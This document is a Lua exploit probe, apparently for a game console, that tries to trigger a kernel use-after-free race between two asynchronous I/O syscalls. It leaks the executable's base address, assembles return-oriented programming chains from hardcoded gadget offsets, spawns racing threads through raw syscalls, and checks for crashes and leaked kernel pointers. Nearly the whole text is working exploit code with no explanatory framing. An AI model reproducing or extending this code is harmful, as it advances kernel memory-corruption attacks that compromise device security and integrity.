-- CRASH_CLASS: HIGH
-- PROBE 72b: 662-vs-663 UAF race v2 — corrected timing
--
-- 72a failed: 662 returned 0x80020010 because request was still PENDING.
-- 662 requires COMPLETED state. 663 only BLOCKS on PENDING.
--
-- Corrected sequence:
--   1. Submit AIO read on socketpair (pending)
--   2. Spawn Thread W: 663(id) → blocks (waiter in Q+0x50)
--   3. Verify W blocked
--   4. Write to sp1 → AIO completes → W starts waking
--   5. IMMEDIATELY spawn Thread A: 662(id) → request IS complete now
--   6. Race: A frees Q while W is removing waiter from Q+0x50
--
-- The marker bug is also fixed: 663 returns 0 on success, so we use
-- a distinct write (0xW663) instead of rax.

print("=== PROBE 72b: 662-vs-663 RACE v2 ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local fd_zero = N(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("zero_fd=" .. fd_zero)

local fake_tcb = memory.alloc(0x1000)
local tcb_addr = N(fake_tcb)
for i = 0, 0xFFC, 8 do wq(tcb_addr + i, uint64(tcb_addr)) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(tcb_addr))

local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local send_buf = memory.alloc(16)
wq(N(send_buf), uint64(0x4141414141414141))

local function aio_submit_on(fd)
    local req = memory.alloc(0x28)
    wq(N(req) + 0x00, uint64(0))
    wq(N(req) + 0x08, uint64(16))
    wq(N(req) + 0x10, uint64(N(data_buf)))
    wq(N(req) + 0x18, uint64(N(result_buf)))
    wq(N(req) + 0x20, uint64(fd))
    local oid = memory.alloc(8); wd(N(oid), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(oid)))
    end)
    return rd(N(oid)) or 0
end

local function aio_poll(aid)
    local oid = memory.alloc(8); wd(N(oid), aid)
    local ost = memory.alloc(8); wd(N(ost), 0xDEAD)
    pcall(function() mk(664)(uint64(N(oid)), uint64(1), uint64(N(ost))) end)
    return rd(N(ost))
end

local function aio_status(aid)
    local oid = memory.alloc(8); wd(N(oid), aid)
    local ost = memory.alloc(8); wd(N(ost), 0xDEAD)
    pcall(function() mk(666)(uint64(N(oid)), uint64(1), uint64(N(ost))) end)
    return rd(N(ost))
end

local function aio_delete(aid)
    local oid = memory.alloc(8); wd(N(oid), aid)
    local ost = memory.alloc(8); wd(N(ost), 0xDEAD)
    pcall(function() mk(662)(uint64(N(oid)), uint64(1), uint64(N(ost))) end)
    return rd(N(ost))
end

local function spawn_thread(chain_fn)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function em(v) wq(rsp + off, v); off = off + 8 end
    chain_fn(em)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    pcall(function() mk(455)(par, uint64(0x38)) end)
    return tid
end

local function busywait(count)
    for w = 1, count do local _ = rd(N(data_buf)) end
end

print("")

-- ============================================================
-- [A] Confirm: poll on pending request (does 664 change state?)
-- ============================================================
print("[A] Poll behavior on pending vs completed requests")

local sp_test = memory.alloc(16)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_test))) end)
local st0 = rd(N(sp_test))
local st1 = rd(N(sp_test) + 4)
print(string.format("  test socketpair: fd0=%d fd1=%d", st0 or -1, st1 or -1))

local tid_pend = aio_submit_on(st0 or 0)
local pre_poll = aio_status(tid_pend)
print(string.format("  pending before poll: status=0x%08X", pre_poll or 0))

aio_poll(tid_pend)
local post_poll = aio_status(tid_pend)
print(string.format("  pending after poll:  status=0x%08X", post_poll or 0))

local try_del = aio_delete(tid_pend)
print(string.format("  delete pending:      status=0x%08X", try_del or 0))

-- Complete the I/O
pcall(function() mk(4)(uint64(st1 or 0), uint64(N(send_buf)), uint64(8)) end)
busywait(10000)

local post_complete = aio_status(tid_pend)
print(string.format("  after sp1 write:     status=0x%08X", post_complete or 0))

-- Poll again after completion
aio_poll(tid_pend)
local post_complete_poll = aio_status(tid_pend)
print(string.format("  poll after complete: status=0x%08X", post_complete_poll or 0))

-- Now delete should work
local del_ok = aio_delete(tid_pend)
print(string.format("  delete completed:    status=0x%08X", del_ok or 0))

pcall(function() mk(6)(uint64(st0 or 0)) end)
pcall(function() mk(6)(uint64(st1 or 0)) end)

if not alive() then print("DEAD after section A"); return end
print("")

-- ============================================================
-- [B] THE RACE: W blocks → complete I/O → spawn A immediately
-- ============================================================
print("[B] RACE: 663-wait vs 662-delete (corrected timing)")

local ITERS = 15
local total_crash = 0
local total_garbage = 0
local total_clean = 0
local total_a_fail = 0

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: *** PROCESS DEAD ***", iter))
        total_crash = total_crash + 1
        break
    end

    -- Fresh socketpair
    local spf = memory.alloc(16)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(spf))) end)
    local s0 = rd(N(spf))
    local s1 = rd(N(spf) + 4)
    if (s0 or 0) <= 0 or (s1 or 0) <= 0 then
        print(string.format("  iter %d: socketpair failed", iter))
        break
    end

    -- Submit pending AIO read on s0
    local aid = aio_submit_on(s0)
    if aid == 0 then
        print(string.format("  iter %d: submit failed", iter))
        pcall(function() mk(6)(uint64(s0)) end)
        pcall(function() mk(6)(uint64(s1)) end)
        break
    end

    -- Poll (needed for 662 later, even though I/O is pending)
    aio_poll(aid)

    -- Shared state
    local marker_W = memory.alloc(8); wq(N(marker_W), uint64(0))
    local marker_A = memory.alloc(8); wq(N(marker_A), uint64(0))
    local sts_W = memory.alloc(8); wd(N(sts_W), 0xDEAD)
    local sts_A = memory.alloc(8); wd(N(sts_A), 0xDEAD)
    local ids_buf = memory.alloc(8); wd(N(ids_buf), aid)

    -- Thread W: sysarch + 663(id) → blocks → write distinct marker
    spawn_thread(function(em)
        em(g_pop_rdi); em(uint64(129))
        em(g_pop_rsi); em(uint64(N(tcb_ptr)))
        em(g_pop_rax); em(uint64(165))
        em(stub)
        -- 663(ids_buf, 1, sts_W) — will BLOCK on pending I/O
        em(g_pop_rdi); em(uint64(N(ids_buf)))
        em(g_pop_rsi); em(uint64(1))
        em(g_pop_rdx); em(uint64(N(sts_W)))
        em(g_pop_rax); em(uint64(663))
        em(stub)
        -- Write distinct marker (NOT rax which is 0 on success)
        em(g_pop_rax); em(uint64(0xBB663))
        em(g_pop_rdi); em(uint64(N(marker_W)))
        em(g_mov_m_rax)
        em(g_pop_rdi); em(uint64(0))
        em(g_pop_rax); em(uint64(431))
        em(stub)
    end)

    -- Wait for W to enter kernel and block on 663
    busywait(80000)

    -- Verify W is blocked
    local w_blk = (rd(N(marker_W)) == 0)

    -- CRITICAL TIMING: write to s1 → completes the AIO → W starts waking
    -- THEN immediately spawn Thread A: 662 on the now-complete request
    pcall(function() mk(4)(uint64(s1), uint64(N(send_buf)), uint64(8)) end)

    -- Spawn A IMMEDIATELY after completion trigger — race against W's wakeup
    spawn_thread(function(em)
        em(g_pop_rdi); em(uint64(129))
        em(g_pop_rsi); em(uint64(N(tcb_ptr)))
        em(g_pop_rax); em(uint64(165))
        em(stub)
        -- 662(ids_buf, 1, sts_A) — delete the now-complete request
        em(g_pop_rdi); em(uint64(N(ids_buf)))
        em(g_pop_rsi); em(uint64(1))
        em(g_pop_rdx); em(uint64(N(sts_A)))
        em(g_pop_rax); em(uint64(662))
        em(stub)
        -- Write marker
        em(g_pop_rax); em(uint64(0xA662))
        em(g_pop_rdi); em(uint64(N(marker_A)))
        em(g_mov_m_rax)
        em(g_pop_rdi); em(uint64(0))
        em(g_pop_rax); em(uint64(431))
        em(stub)
    end)

    -- Wait for both threads
    busywait(300000)

    local mW = rd(N(marker_W))
    local mA = rd(N(marker_A))
    local sW = rd(N(sts_W))
    local sA = rd(N(sts_A))

    local w_done = (mW ~= 0)
    local a_done = (mA ~= 0)

    local result_tag = "?"
    if not alive() then
        result_tag = "CRASH"
        total_crash = total_crash + 1
    elseif sA == 0x80020010 then
        result_tag = "A_REJECT"
        total_a_fail = total_a_fail + 1
    elseif sA == 0 and w_done then
        -- A deleted successfully AND W returned — check W's status
        if sW ~= 0x00000003 and sW ~= 0x00010003
           and sW ~= 0x80020003 and sW ~= 0xDEAD then
            result_tag = "GARBAGE"
            total_garbage = total_garbage + 1
        else
            result_tag = "CLEAN"
            total_clean = total_clean + 1
        end
    elseif sA == 0 and not w_done then
        result_tag = "W_LOST"
        total_crash = total_crash + 1
    else
        result_tag = string.format("A=0x%X", sA or 0)
        total_clean = total_clean + 1
    end

    print(string.format(
        "  iter %2d: W_blk=%s W_mk=0x%X W_sts=0x%08X | A_mk=0x%X A_sts=0x%08X -> %s",
        iter,
        w_blk and "Y" or "N",
        mW or 0, sW or 0,
        mA or 0, sA or 0,
        result_tag))

    -- Check for kernel pointer in W status (qword)
    if w_done and sW ~= 0xDEAD then
        local qw = rq(N(sts_W))
        if qw then
            local h, l = get_hi_lo(qw)
            if h >= 0xFFFF8000 then
                print(string.format("  *** KERNEL POINTER: %s ***", fmt(qw)))
            end
        end
    end

    -- Cleanup
    pcall(function() mk(6)(uint64(s0)) end)
    pcall(function() mk(6)(uint64(s1)) end)

    if result_tag == "CRASH" or result_tag == "W_LOST" then break end
end

print("")
print("[C] SUMMARY")
print(string.format("  iterations:   %d", ITERS))
print(string.format("  CRASH/W_LOST: %d", total_crash))
print(string.format("  GARBAGE:      %d", total_garbage))
print(string.format("  A_REJECT:     %d (662 still refused — timing too slow)", total_a_fail))
print(string.format("  CLEAN:        %d", total_clean))
print(string.format("  process:      %s", alive() and "ALIVE" or "DEAD"))

if total_crash > 0 then
    print("")
    print("*** UAF TRIGGERED ***")
elseif total_garbage > 0 then
    print("")
    print("*** GARBAGE STATUS — reclaimed data leaked ***")
elseif total_a_fail == ITERS then
    print("")
    print("662 always rejected — request not yet complete when A runs.")
    print("Need: pre-spawn A with UMTX gate, or tighter trigger loop.")
elseif total_clean > 0 then
    print("")
    print("A deleted OK, W returned clean. Possible:")
    print("  - 662 wakes waiters before freeing Q (safe design)")
    print("  - W finished before A entered 662 (need spray)")
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 72b COMPLETE ===")
